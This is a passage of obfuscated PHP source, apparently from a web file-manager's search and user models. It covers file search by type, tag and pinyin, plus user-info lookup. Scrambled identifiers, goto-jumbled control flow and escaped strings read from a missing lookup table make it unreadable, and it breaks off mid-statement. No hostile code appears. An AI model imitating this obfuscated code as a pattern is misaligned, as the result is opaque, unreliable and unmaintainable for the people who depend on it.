$this->listData($fÂÈ…ñŞ); $Ağ±áÑ˜â = array_to_keyvalue_group($BÖÁƒ“äŒ, $aç¼¨ï«Ÿ[444]); goto eËö‰Œ×ÍÉ; fÖÁ‚“‘´: if (!$BâõĞ‚ñ…í) { return; } $this->where(array($aç¼¨ï«Ÿ[392] => array($aç¼¨ï«Ÿ[7], $BâõĞ‚ñ…í)))->delete(); Model($aç¼¨ï«Ÿ[447])->remove($B¡ÅØîŸ¨); goto BÚª©ÒËç; BÚª©ÒËç: } public function userSpace() { $d™öÛ‰ïÅò =& $_SERVER[¢Í]; $FÑ±óİã½… = $this->tablePrefix; $B©É„ÃÚÁ = array($d™öÛ‰ïÅò[1481] => USER_ID); $B¼ö¿³£ñ¥ = "{$FÑ±óİã½…}\151\x6f\137\x66\x69\x6c\145\x20\146\151\154\x65\163\x20\x6f\156\x20\x66\x69\x6c\x65\163\56\x66\x69\154\x65\111\104\x20\x3d\40\x68\151\x73\164\x6f\162\x79\56\146\151\x6c\x65\111\104"; return $this->alias($d™öÛ‰ïÅò[1887])->where($B©É„ÃÚÁ)->join($B¼ö¿³£ñ¥, $d™öÛ‰ïÅò[1888])->sum($d™öÛ‰ïÅò[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($bÜÙ»¬¬À‘) { goto F œ‰Ç¹; F œ‰Ç¹: $b¤°ªñ¦®“ =& $_SERVER[¢Í]; $B§ø‘ÍÏ» = KodIO::fileTypeList(); $AŠîŠÇ‚ŠÌ = $B§ø‘ÍÏ»[$bÜÙ»¬¬À‘]; goto f¹Øç›¥ç¨; f¹Øç›¥ç¨: if (!$AŠîŠÇ‚ŠÌ) { return array(); } $e‹Äº…©Ü = $AŠîŠÇ‚ŠÌ[$b¤°ªñ¦®“[175]]; $a¹ìíö…îÄ = $b¤°ªñ¦®“[7]; goto B´¾¢Ç½¤â; B´¾¢Ç½¤â: if (!$AŠîŠÇ‚ŠÌ[$b¤°ªñ¦®“[175]]) { $d÷ôî–„· = array_to_keyvalue($B§ø‘ÍÏ», $b¤°ªñ¦®“[33], $b¤°ªñ¦®“[175]); $e‹Äº…©Ü = implode($b¤°ªñ¦®“[47], $d÷ôî–„·); $a¹ìíö…îÄ = $b¤°ªñ¦®“[1890]; } $c´¾Î“šˆ = explode($b¤°ªñ¦®“[47], trim($e‹Äº…©Ü, $b¤°ªñ¦®“[47])); return array($a¹ìíö…îÄ, $c´¾Î“šˆ); goto d«³ÁÇÈÆ; d«³ÁÇÈÆ: } public function listPathType($DÁƒí¤ôÆô) { $Eù¿Ñ‹ì†… =& $_SERVER[¢Í]; $d†ß¤µŞÂ = $this->fileTypeWhere($DÁƒí¤ôÆô); if (!$d†ß¤µŞÂ) { return array(); } $f¨¾˜§¥ò¦ = array($Eù¿Ñ‹ì†…[547] => SourceModel::TYPE_USER, $Eù¿Ñ‹ì†…[548] => USER_ID, $Eù¿Ñ‹ì†…[544] => 0, $Eù¿Ñ‹ì†…[545] => $d†ß¤µŞÂ); return $this->listSource($f¨¾˜§¥ò¦); } public function listSearch($CâÎ­”º‚™, $e±ï¨¤Èà’ = 300) { goto cªš˜§¦Ş; A¬Øøñ¼öÖ: $this->_listSearchGroupTag($DöŸ×™ÂÜÌ, $CâÎ­”º‚™, $eˆ‰ˆÂ–); $this->_listDataApply($DöŸ×™ÂÜÌ[$cŸíÁ¤òñ[370]]); $this->_listMake($DöŸ×™ÂÜÌ); goto F”èÁŸâé…; cªš˜§¦Ş: $cŸíÁ¤òñ =& $_SERVER[¢Í]; if (isset($CâÎ­”º‚™[$cŸíÁ¤òñ[1733]]) && $CâÎ­”º‚™[$cŸíÁ¤òñ[1733]]) { $CâÎ­”º‚™[$cŸíÁ¤òñ[1733]] = str_replace($cŸíÁ¤òñ[383], $cŸíÁ¤òñ[1891], trim($CâÎ­”º‚™[$cŸíÁ¤òñ[1733]])); } $AéÈÌ”Áø´ = $this->_parseSearchWhere($CâÎ­”º‚™); goto A°Ïî—ÉÖÙ; d»Ìšíå¥Ù: $this->_listSearchBindPinyin($CâÎ­”º‚™, $AéÈÌ”Áø´, $fïˆğ²’); $this->alias($cŸíÁ¤òñ[513])->_makeOrder(); $AéÈÌ”Áø´ = $this->parseWhereLike($AéÈÌ”Áø´); goto B—ë¶ëíï¶; F”èÁŸâé…: return $DöŸ×™ÂÜÌ; goto F”’µ­ºœÓ; A°Ïî—ÉÖÙ: if (!isset($AéÈÌ”Áø´[$cŸíÁ¤òñ[422]])) { $AéÈÌ”Áø´[$cŸíÁ¤òñ[422]] = 0; } $fïˆğ²’ = $cŸíÁ¤òñ[1892]; $eˆ‰ˆÂ– = $fïˆğ²’; goto d»Ìšíå¥Ù; B—ë¶ëíï¶: $DöŸ×™ÂÜÌ = $this->distinct(!0)->field($fïˆğ²’)->where($AéÈÌ”Áø´)->selectPage($e±ï¨¤Èà’); $this->_listSearchDesc($DöŸ×™ÂÜÌ, $CâÎ­”º‚™, $eˆ‰ˆÂ–); $this->_listSearchTag($DöŸ×™ÂÜÌ, $CâÎ­”º‚™, $eˆ‰ˆÂ–); goto A¬Øøñ¼öÖ; F”’µ­ºœÓ: } private function _listSearchTag(&$Fè±õí¤Ğ«, $AÈ¡Ê¨ùÙÇ, $E­çÒóô¾) { goto bìèÌ£Ç»‰; AâÃ‘ºŒêÈ: $FİÃÜ§‡—‘ = array(); $B šÌÉÉ½† = $AÈ¡Ê¨ùÙÇ[$b¦œÙ‰¼Ë[1733]]; foreach ($BÖÌÑ…ñò¼ as $EŒ¦Ä‰¯î) { $bˆõ¸§‹¡ = $EŒ¦Ä‰¯î[$b¦œÙ‰¼Ë[28]]; $f¿¼¬•£±Ì = str_replace($b¦œÙ‰¼Ë[50], $b¦œÙ‰¼Ë[33], Pinyin::encode($bˆõ¸§‹¡)); if (stripos($bˆõ¸§‹¡, $B šÌÉÉ½†) !== !1 || stripos($f¿¼¬•£±Ì, $B šÌÉÉ½†) !== !1) { $FİÃÜ§‡—‘[] = $EŒ¦Ä‰¯î[$b¦œÙ‰¼Ë[392]]; } } goto c›éñ‡Ì²¹; dõ¢êİÃÁ: $d¿›ÇĞÊ±¸ = array_to_keyvalue($d¿›ÇĞÊ±¸, $b¦œÙ‰¼Ë[33], $b¦œÙ‰¼Ë[85]); $aÆßÆ•„ = array_unique($d¿›ÇĞÊ±¸); $this->_listSearchMerge($Fè±õí¤Ğ«, $AÈ¡Ê¨ùÙÇ, $E­çÒóô¾, $aÆßÆ•„); goto FÀ™–Ñã¯ì; c›éñ‡Ì²¹: if (!$FİÃÜ§‡—‘) { return; } $EÍÑ¡ô£š² = array($b¦œÙ‰¼Ë[418] => array($b¦œÙ‰¼Ë[7], $FİÃÜ§‡—‘), $b¦œÙ‰¼Ë[1489] => USER_ID); $d¿›ÇĞÊ±¸ = Model($b¦œÙ‰¼Ë[419])->field($b¦œÙ‰¼Ë[85])->where($EÍÑ¡ô£š²)->select(); goto dõ¢êİÃÁ; bìèÌ£Ç»‰: $b¦œÙ‰¼Ë =& $_SERVER[¢Í]; if (!$AÈ¡Ê¨ùÙÇ[$b¦œÙ‰¼Ë[1733]] || $Fè±õí¤Ğ«[$b¦œÙ‰¼Ë[367]][$b¦œÙ‰¼Ë[356]] > 1) { return; } $BÖÌÑ…ñò¼ = Model($b¦œÙ‰¼Ë[1893])->listData(); goto AâÃ‘ºŒêÈ; FÀ™–Ñã¯ì: } private function _listSearchDesc(&$fö§ô¥£­, $A „®©ÎÁ‡, $a¡øÔß©’) { goto bØ™“Õ‘Å¢; fí¤ÈÑ´Üí: $aÄ ƒóğó = Model($bÄÎ„íËÏø[530])->field($bÄÎ„íËÏø[394])->where($FáŠ¯ÖÊ‘ )->select(); $aÙÇš÷’ = array_to_keyvalue($aÄ ƒóğó, $bÄÎ„íËÏø[33], $bÄÎ„íËÏø[394]); $this->_listSearchMerge($fö§ô¥£­, $A „®©ÎÁ‡, $a¡øÔß©’, $aÙÇš÷’); goto C¿É…÷Š½¬; d«Ò ŒøÓ: $f¤Î¼ÁÂ×† = array_unique($f¤Î¼ÁÂ×†); if (!$f¤Î¼ÁÂ×†) { return; } $FáŠ¯ÖÊ‘  = array($bÄÎ„íËÏø[394] => array($bÄÎ„íËÏø[7], $f¤Î¼ÁÂ×†), $bÄÎ„íËÏø[99] => $bÄÎ„íËÏø[430], $bÄÎ„íËÏø[375] => array($bÄÎ„íËÏø[382], $bÄÎ„íËÏø[1735] . $A „®©ÎÁ‡[$bÄÎ„íËÏø[1733]] . $bÄÎ„íËÏø[1735])); goto fí¤ÈÑ´Üí; bØ™“Õ‘Å¢: $bÄÎ„íËÏø =& $_SERVER[¢Í]; if (!$A „®©ÎÁ‡[$bÄÎ„íËÏø[1733]] || $fö§ô¥£­[$bÄÎ„íËÏø[367]][$bÄÎ„íËÏø[356]] > 1) { return; } $f¤Î¼ÁÂ×† = $this->listSearchChildren($A „®©ÎÁ‡[$bÄÎ„íËÏø[487]]); goto d«Ò ŒøÓ; C¿É…÷Š½¬: } private function _listSearchGroupTag(&$D¬ñ“„„ñ¾, $F«Éóæ„È, $CÃå„ƒó‡¹) { goto d›Ù®ãâò¥; BÅ´ÖšÎÖ: $EÄ‘­ª¡ë = array(); $C§õÍ±ÜÒÇ = $F«Éóæ„È[$B…¬‹×©ĞÄ[1733]]; foreach ($eš¯‹ÀëßÇ[$B…¬‹×©ĞÄ[370]] as $e¹¿ëê‡–µ) { $E­†Æ–ä£Ô = $e¹¿ëê‡–µ[$B…¬‹×©ĞÄ[28]]; $B¦³èËì…á = str_replace($B…¬‹×©ĞÄ[50], $B…¬‹×©ĞÄ[33], Pinyin::encode($E­†Æ–ä£Ô)); if (stripos($E­†Æ–ä£Ô, $C§õÍ±ÜÒÇ) !== !1 || stripos($B¦³èËì…á, $C§õÍ±ÜÒÇ) !== !1) { $EÄ‘­ª¡ë[] = $e¹¿ëê‡–µ[$B…¬‹×©ĞÄ[392]]; } } goto A‹Õë¼àö¤; d›Ù®ãâò¥: $B…¬‹×©ĞÄ =& $_SERVER[¢Í]; if (!$F«Éóæ„È[$B…¬‹×©ĞÄ[1733]] || $D¬ñ“„„ñ¾[$B…¬‹×©ĞÄ[367]][$B…¬‹×©ĞÄ[356]] > 1 || !$F«Éóæ„È[$B…¬‹×©ĞÄ[487]]) { return; } $EöÍãö¤¦ = $this->sourceInfo($F«Éóæ„È[$B…¬‹×©ĞÄ[487]]); goto f¨…ŒÒ‰§•; f¨…ŒÒ‰§•: if (!$EöÍãö¤¦ || $EöÍãö¤¦[$B…¬‹×©ĞÄ[396]] != SourceModel::TYPE_GROUP) { return; } $dÚË§â‡Š = $EöÍãö¤¦[$B…¬‹×©ĞÄ[482]]; $eš¯‹ÀëßÇ = Model($B…¬‹×©ĞÄ[1894])->get($dÚË§â‡Š); goto BÅ´ÖšÎÖ; A‹Õë¼àö¤: if (!$EÄ‘­ª¡ë) { return; } $aÉ…ÉÓ¥ñ× = array($B…¬‹×©ĞÄ[418] => array($B…¬‹×©ĞÄ[7], $EÄ‘­ª¡ë), $B…¬‹×©ĞÄ[1489] => 0, $B…¬‹×©ĞÄ[29] => $B…¬‹×©ĞÄ[1753] . $dÚË§â‡Š); $e©‚Ø“¤Ö = Model($B…¬‹×©ĞÄ[419])->field($B…¬‹×©ĞÄ[85])->where($aÉ…ÉÓ¥ñ×)->select(); goto C¥İ¼ùÑ™; C¥İ¼ùÑ™: $e©‚Ø“¤Ö = array_to_keyvalue($e©‚Ø“¤Ö, $B…¬‹×©ĞÄ[33], $B…¬‹×©ĞÄ[85]); $A‘‹ŠÌ†Ôİ = array_unique($e©‚Ø“¤Ö); $this->_listSearchMerge($D¬ñ“„„ñ¾, $F«Éóæ„È, $CÃå„ƒó‡¹, $A‘‹ŠÌ†Ôİ); goto EÑŸÙàÕ„ö; EÑŸÙàÕ„ö: } private function _listSearchMerge(&$fŸ°ï§Ÿ»¬, $bˆ­ô¤ÓİŒ, $Fë®äÉŒ½Á, $d†Ì Ô„æê) { goto cÍ ³ç‰ì; cÀµ°ÃÓ‰: $dƒƒî“Ü”î = array_diff($d†Ì Ô„æê, $aÙÇ¤´­³); if (!$dƒƒî“Ü”î) { return; } $DßªÚÉÉ™¢ = array($D†…ˆŒõè½[394] => array($D†…ˆŒõè½[7], $dƒƒî“Ü”î)); goto cŸÔ‡Ì–ğ¯; cŸÔ‡Ì–ğ¯: $bª‚é¼÷Ö = $this->field($Fë®äÉŒ½Á)->where($DßªÚÉÉ™¢)->select(); if (!$bª‚é¼÷Ö) { return; } $C˜£ÃØ«§ = array(); goto bÂµœàÛ‰ï; cÍ ³ç‰ì: $D†…ˆŒõè½ =& $_SERVER[¢Í]; if (!$d†Ì Ô„æê) { return; } $aÙÇ¤´­³ = array_to_keyvalue($fŸ°ï§Ÿ»¬[$D†…ˆŒõè½[370]], $D†…ˆŒõè½[33], $D†…ˆŒõè½[394]); goto cÀµ°ÃÓ‰; bÂµœàÛ‰ï: foreach ($bª‚é¼÷Ö as $a³¤ØòÌß) { $DåÇ×Œ„÷š = $D†…ˆŒõè½[47] . $bˆ­ô¤ÓİŒ[$D†…ˆŒõè½[487]] . $D†…ˆŒõè½[47]; if (stripos($a³¤ØòÌß[$D†…ˆŒõè½[485]], $DåÇ×Œ„÷š) !== !1) { $C˜£ÃØ«§[] = $a³¤ØòÌß; } } $fŸ°ï§Ÿ»¬[$D†…ˆŒõè½[370]] = array_merge($C˜£ÃØ«§, $fŸ°ï§Ÿ»¬[$D†…ˆŒõè½[370]]); $fŸ°ï§Ÿ»¬[$D†…ˆŒõè½[367]][$D†…ˆŒõè½[368]] += count($C˜£ÃØ«§); goto a†‹»œ­Å–; a†‹»œ­Å–: } public function listSearchChildren($E´Ìô«¦Ì, $céÚŞÎÜÜ’ = 5000) { goto Aµˆ¡¼îæ‡; Aµˆ¡¼îæ‡: $aìÕÄ’ğ´ö =& $_SERVER[¢Í]; $f©†æøªäë = array(); $c‡š’Üõ—Ÿ = $this->sourceInfo($E´Ìô«¦Ì); goto FØ¬ñß¨Ò’; FØ¬ñß¨Ò’: $d©§ä‡ß¼÷ = array($aìÕÄ’ğ´ö[485] => array($aìÕÄ’ğ´ö[382], $c‡š’Üõ—Ÿ[$aìÕÄ’ğ´ö[485]] . $c‡š’Üõ—Ÿ[$aìÕÄ’ğ´ö[394]] . $aìÕÄ’ğ´ö[510])); $b«š¿İ¸ÆŒ = $this->field($aìÕÄ’ğ´ö[394])->cache(null, 600)->where($d©§ä‡ß¼÷)->count(); if ($b«š¿İ¸ÆŒ > $céÚŞÎÜÜ’) { return $this->_listSearchChildrenNear($E´Ìô«¦Ì, $céÚŞÎÜÜ’); } goto DœÒ¨”‘™¾; DœÒ¨”‘™¾: $a¶‘ÏØÙùÍ = $this->field($aìÕÄ’ğ´ö[394])->where($d©§ä‡ß¼÷)->select(); $f©†æøªäë = array_to_keyvalue($a¶‘ÏØÙùÍ, $aìÕÄ’ğ´ö[33], $aìÕÄ’ğ´ö[394]); return $f©†æøªäë; goto cÒ·ø¾¤—Š; cÒ·ø¾¤—Š: } private function _listSearchChildrenNear($aÆ·ˆ½…Ü, $Eé’ˆ‚áß¨) { goto f´‘ÉŠ÷å¡; Fã¡‡òÉ³ï: $EÙ‚‹Ú¦¡» = $this->field($AŠªƒŸ«[1895])->where($c›Œ‡”ø‚½)->select(); $c‰ĞÏ³ĞÕó = array_to_keyvalue(array_filter_by_field($EÙ‚‹Ú¦¡», $AŠªƒŸ«[395], $AŠªƒŸ«[93]), $AŠªƒŸ«[33], $AŠªƒŸ«[394]); $bÉß²²™Äï = array_merge($bÉß²²™Äï, array_to_keyvalue($EÙ‚‹Ú¦¡», $AŠªƒŸ«[33], $AŠªƒŸ«[394])); goto DÚ˜„¶Ö‰Ò; E©šè‰¿Åƒ: $bÉß²²™Äï = array_merge($bÉß²²™Äï, array_to_keyvalue($EÙ‚‹Ú¦¡», $AŠªƒŸ«[33], $AŠªƒŸ«[394])); $bÉß²²™Äï = array_slice($bÉß²²™Äï, 0, $Eé’ˆ‚áß¨); return $bÉß²²™Äï; goto cë–Ê‡®…ó; DÚ˜„¶Ö‰Ò: if (!$c‰ĞÏ³ĞÕó) { return $bÉß²²™Äï; } $c›Œ‡”ø‚½ = array($AŠªƒŸ«[487] => array($AŠªƒŸ«[7], $c‰ĞÏ³ĞÕó)); $EÙ‚‹Ú¦¡» = $this->field($AŠªƒŸ«[1895])->where($c›Œ‡”ø‚½)->limit($Eé’ˆ‚áß¨)->select(); goto E©šè‰¿Åƒ; f´‘ÉŠ÷å¡: $AŠªƒŸ« =& $_SERVER[¢Í]; $bÉß²²™Äï = array(); $c›Œ‡”ø‚½ = array($AŠªƒŸ«[487] => $aÆ·ˆ½…Ü); goto Fã¡‡òÉ³ï; cë–Ê‡®…ó: } private function _listSearchBindPinyin($f¾Ô¨Öí»£, &$B»Ã·¬×â¼, &$F›Ò‰ÆâíË) { goto DŠ¡Å½‰İ; FìåŸèàòÜ: foreach ($f±ëÑÓÎ Ï as $cçğ¢öÄœâ) { $f¹‡Œ‘—[] = array($f¶ÌƒÖšìÙ[1899] => $cçğ¢öÄœâ, $f¶ÌƒÖšìÙ[925] => $f¶ÌƒÖšìÙ[1737], array($f¶ÌƒÖšìÙ[1900] => $cçğ¢öÄœâ, $f¶ÌƒÖšìÙ[1901] => array($f¶ÌƒÖšìÙ[7], array($f¶ÌƒÖšìÙ[441], $f¶ÌƒÖšìÙ[440])))); } $this->join($eÌ‚ğÃÅĞ); $B»Ã·¬×â¼ = $f¹‡Œ‘—; goto c©ÖğêÒÖÄ; EŒ´‹‰ë: $f¹‡Œ‘— = array(); $F›Ò‰ÆâíË = str_replace(array($f¶ÌƒÖšìÙ[56], $f¶ÌƒÖšìÙ[50], $f¶ÌƒÖšìÙ[1896]), $f¶ÌƒÖšìÙ[33], $F›Ò‰ÆâíË); $F›Ò‰ÆâíË = $f¶ÌƒÖšìÙ[1897] . str_replace($f¶ÌƒÖšìÙ[47], $f¶ÌƒÖšìÙ[1898], $F›Ò‰ÆâíË); goto b†¶ßÏ”º; DŠ¡Å½‰İ: $f¶ÌƒÖšìÙ =& $_SERVER[¢Í]; if (!Input::check($f¾Ô¨Öí»£[$f¶ÌƒÖšìÙ[1733]], $f¶ÌƒÖšìÙ[321]) || strlen($f¾Ô¨Öí»£[$f¶ÌƒÖšìÙ[1733]]) < 2) { return; } $eÌ‚ğÃÅĞ = "\114\105\106\x54\40\112\117\111\116\40{$this->tablePrefix}\151\x6f\137\163\x6f\x75\162\x63\x65\137\x6d\145\x74\x61\x20\155\145\164\x61\x20\x6f\156\x20\163\x6f\165\162\143\145\x2e\x73\x6f\x75\162\143\x65\x49\104\40\75\x20\155\145\x74\x61\56\x73\157\165\162\x63\x65\x49\x44"; goto EŒ´‹‰ë; b†¶ßÏ”º: $f±ëÑÓÎ Ï = $B»Ã·¬×â¼[$f¶ÌƒÖšìÙ[28]]; unset($B»Ã·¬×â¼[$f¶ÌƒÖšìÙ[28]]); foreach ($B»Ã·¬×â¼ as $B†ö“¸óß => $f–£óË¾ƒœ) { $f¹‡Œ‘—[$f¶ÌƒÖšìÙ[1897] . $B†ö“¸óß] = $f–£óË¾ƒœ; } goto FìåŸèàòÜ; c©ÖğêÒÖÄ: } private function _parseSearchWhere($C¢ùÆ–¶¢­) { goto dË»î±Á; c‡¶Û‰øÙ¼: if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1733]]) && $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1733]]) { $BªÂÃ°”Ã¼ = $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1733]]; $B¶Ú‹’‚Ó‡ = explode($EÓ©ª®¦‚[50], $BªÂÃ°”Ã¼); if (strlen($BªÂÃ°”Ã¼) > 2 && (substr($BªÂÃ°”Ã¼, 0, 1) == $EÓ©ª®¦‚[123] && substr($BªÂÃ°”Ã¼, -1) == $EÓ©ª®¦‚[123]) || substr($BªÂÃ°”Ã¼, 0, 1) == $EÓ©ª®¦‚[65] && substr($BªÂÃ°”Ã¼, -1) == $EÓ©ª®¦‚[65]) { $BªÂÃ°”Ã¼ = substr($BªÂÃ°”Ã¼, 1, -1); $B¶Ú‹’‚Ó‡ = array($BªÂÃ°”Ã¼); } $D’’ÏÌ²Ó[$EÓ©ª®¦‚[28]] = array(array($EÓ©ª®¦‚[509], $EÓ©ª®¦‚[1735] . $BªÂÃ°”Ã¼ . $EÓ©ª®¦‚[1735])); if (count($B¶Ú‹’‚Ó‡) > 1) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[28]] = array(); foreach ($B¶Ú‹’‚Ó‡ as $D¨”Ï×ò—Ä) { if (!trim($D¨”Ï×ò—Ä)) { continue; } $D’’ÏÌ²Ó[$EÓ©ª®¦‚[28]][] = array($EÓ©ª®¦‚[509], $EÓ©ª®¦‚[1735] . trim($D¨”Ï×ò—Ä) . $EÓ©ª®¦‚[1735]); } } } return $D’’ÏÌ²Ó; goto f÷æ‘™Ùèî; dÎç¿ì¨ò›: if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[560]])) { $D’’ÏÌ²Ó[] = array($EÓ©ª®¦‚[404] => $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[560]], $EÓ©ª®¦‚[403] => $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[560]], $EÓ©ª®¦‚[925] => $EÓ©ª®¦‚[1737]); } if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[397]])) { $DÔÀ„ŠÚå“ = $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[397]]; if ($DÔÀ„ŠÚå“ == $EÓ©ª®¦‚[86]) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[395]] = 1; } else { if ($DÔÀ„ŠÚå“ == $EÓ©ª®¦‚[1907]) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[395]] = 0; } else { if ($DÔÀ„ŠÚå“) { $DÔÀ„ŠÚå“ = is_array($DÔÀ„ŠÚå“) ? $DÔÀ„ŠÚå“ : explode($EÓ©ª®¦‚[47], $DÔÀ„ŠÚå“); $D’’ÏÌ²Ó[$EÓ©ª®¦‚[397]] = array($EÓ©ª®¦‚[409], $DÔÀ„ŠÚå“); $D’’ÏÌ²Ó[$EÓ©ª®¦‚[395]] = 0; } } } } if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[487]])) { $DÓÛ¿ßŒ‚Ï = $this->sourceInfo($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[487]]); $D’’ÏÌ²Ó[$EÓ©ª®¦‚[551]] = array($EÓ©ª®¦‚[509], $DÓÛ¿ßŒ‚Ï[$EÓ©ª®¦‚[485]] . $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[487]] . $EÓ©ª®¦‚[510]); } goto c‡¶Û‰øÙ¼; dğ‚Ä‚óğ•: if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[473]])) { $bñ†ùñ—Á… = array($EÓ©ª®¦‚[1903], $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[473]]); if ($D’’ÏÌ²Ó[$EÓ©ª®¦‚[117]]) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[117]] = array($D’’ÏÌ²Ó[$EÓ©ª®¦‚[117]], $bñ†ùñ—Á…, $EÓ©ª®¦‚[1904]); } else { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[117]] = $bñ†ùñ—Á…; } } if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1905]])) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[87]] = array($EÓ©ª®¦‚[1902], $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1905]]); } if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1906]])) { $bñ†ùñ—Á… = array($EÓ©ª®¦‚[1903], $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[1906]]); if ($D’’ÏÌ²Ó[$EÓ©ª®¦‚[87]]) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[87]] = array($D’’ÏÌ²Ó[$EÓ©ª®¦‚[87]], $bñ†ùñ—Á…, $EÓ©ª®¦‚[1904]); } else { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[87]] = $bñ†ùñ—Á…; } } goto dÎç¿ì¨ò›; dË»î±Á: $EÓ©ª®¦‚ =& $_SERVER[¢Í]; $D’’ÏÌ²Ó = array(); if (isset($C¢ùÆ–¶¢­[$EÓ©ª®¦‚[716]])) { $D’’ÏÌ²Ó[$EÓ©ª®¦‚[117]] = array($EÓ©ª®¦‚[1902], $C¢ùÆ–¶¢­[$EÓ©ª®¦‚[716]]); } goto dğ‚Ä‚óğ•; f÷æ‘™Ùèî: } } goto AÒ¯ÒÖ÷; B“ƒ£»Œá: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\145" => "\165\x73\145\162\137\155\145\x74\141", "\x6d\x65\164\141\x46\151\145\x6c\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\x2c\x6e\x69\143\153\x4e\x61\x6d\145\54\156\141\155\x65\54\141\166\141\x74\141\x72\54\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($eàò¤®½è…) { $d±˜×ˆÚšğ =& $_SERVER[¢Í]; $eçœ»Ïæ± = $d±˜×ˆÚšğ[2065]; return array($d±˜×ˆÚšğ[1721] => array($eàò¤®½è…[0], $eçœ»Ïæ±), $d±˜×ˆÚšğ[1723] => array($eàò¤®½è…[0], $eçœ»Ïæ±), $d±˜×ˆÚšğ[2066] => array($eàò¤®½è…[0], $eçœ»Ïæ±)); } protected function getInfo($eš„™îÉ»Ù, $FÅ™Ş£îïÑ = false) { $EÊ»½ìéŠå = $this->getInfoSimple($eš„™îÉ»Ù); if (!is_array($EÊ»½ìéŠå)) { return array(); } if ($FÅ™Ş£îïÑ) { return $this->_getInfoApply($EÊ»½ìéŠå); } return $this->cacheFunctionGet($_SERVER[¢Í][1777], $eš„™îÉ»Ù); } protected function getInfoFull($FåĞä±™¿», $A‚Ï‡ŸÌä = false) { $d••Æ¨õ± = $this->getInfoSimple($FåĞä±™¿»); if (!is_array($d••Æ¨õ±)) { return array(); } if ($A‚Ï‡ŸÌä) { return $this->_getInfoApply($d••Æ¨õ±, !0); return $this->_getInfoApply($d••Æ¨õ±, !0); } return $this->cacheFunctionGet($_SERVER[¢Í][2067], $FåĞä±™¿»); } private function _getInfoApply($cÈ™¦Ó¢ì, $a¢î®“³¯ = false) { goto Báå–ÄéÍÑ; Báå–ÄéÍÑ: $EÍË„ª =& $_SERVER[¢Í]; if (!$cÈ™¦Ó¢ì) { return $cÈ™¦Ó¢ì; } $b­õ‚ºÖ ğ = md5($EÍË„ª[2068] . $cÈ™¦Ó¢ì[$EÍË„ª[817]] . $EÍË„ª[2069] . $cÈ™¦Ó¢ì[$EÍË„ª[28]]); goto eÂ¿’ßñ—¤; eÂ¿’ßñ—¤: $cÈ™¦Ó¢ì = $this->_listDataApplyItem($cÈ™¦Ó¢ì); $Aˆ¢Û¼¯¢ = Model($EÍË„ª[1169])->metaGet($cÈ™¦Ó¢ì[$EÍË„ª[416]][$EÍË„ª[394]]); $cÈ™¦Ó¢ì[$EÍË„ª[2070]] = $b­õ‚ºÖ ğ; goto FºŠ±‘Şßó; FºŠ±‘Şßó: $cÈ™¦Ó¢ì[$EÍË„ª[416]][$EÍË„ª[1909]] = isset($Aˆ¢Û¼¯¢[$EÍË„ª[1910]]) ? $Aˆ¢Û¼¯¢[$EÍË„ª[1910]] : null; if ($a¢î®“³¯) { $cÈ™¦Ó¢ì[$EÍË„ª[442]] = $this->metaGet($cÈ™¦Ó¢ì[$EÍË„ª[1489]]); } return $cÈ™¦Ó¢ì; goto dÉœÙè¹É; dÉœÙè¹É: } protected function getInfoSimple($eå”™ï¦‰, $dí“˜ÖÄĞ = false) { $AöÃ§Úçíã =& $_SERVER[¢Í]; if (!$eå”™ï¦‰) { return array(); } if ($dí“˜ÖÄĞ) { $Bä…È¥Æš = $this->where(array($AöÃ§Úçíã[1489] => intval($eå”™ï¦‰)))->find(); if (!is_array($Bä…È¥Æš)) { return array(); } $Bä…È¥Æš[$AöÃ§Úçíã[2071]] = Action($AöÃ§Úçíã[2072])->parseUrl($Bä…È¥Æš[$AöÃ§Úçíã[2071]]); return $Bä…È¥Æš; } return $this->cacheFunctionGet($AöÃ§Úçíã[1724], $eå”™ï¦‰); } protected function getInfoSimpleOuter($eâß‘¼ºø‡) { goto AİäŒ§Ääµ; Døœ¼áŠŞ‰: return $b­‰‹¶ôìÛ; goto cÌ¥âÒ¬éñ; eˆãé÷ã: $b­‰‹¶ôìÛ = array_field_key($EŠà¥¡£ä, explode($DÌ¡ªÕÙ£«[47], $this->simpleField)); if (!$b­‰‹¶ôìÛ) { return array($DÌ¡ªÕÙ£«[1489] => $DÌ¡ªÕÙ£«[1052], $DÌ¡ªÕÙ£«[28] => $DÌ¡ªÕÙ£«[167] . LNG($DÌ¡ªÕÙ£«[2075]) . $DÌ¡ªÕÙ£«[502], $DÌ¡ªÕÙ£«[2071] => STATIC_PATH . $DÌ¡ªÕÙ£«[2076]); } $b­‰‹¶ôìÛ[$DÌ¡ªÕÙ£«[2071]] = 